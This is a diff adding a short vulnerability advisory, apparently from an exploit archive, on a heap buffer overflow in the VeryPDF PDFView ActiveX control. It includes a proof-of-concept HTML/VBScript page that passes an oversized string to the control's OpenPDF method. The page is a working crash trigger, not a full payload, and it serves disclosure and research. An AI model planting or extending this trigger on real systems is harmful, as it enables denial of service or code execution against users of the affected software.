@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/32313/info
+
+The VeryPDF PDFView ActiveX control is prone to a heap buffer-overflow vulnerability because it fails to properly bounds-check user-supplied data before copying it into an insufficiently sized memory buffer.
+
+An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in denial-of-service conditions. 
+
+<object classid='clsid:433268D7-2CD4-43E6-AA24-2188672E7252' id='target'></object> <script language='vbscript'> Sub Boom buff = String(1006, "A") target.OpenPDF buff, 1, 1 End Sub </script> <input type=button onclick=Boom() value='Boom?'> 
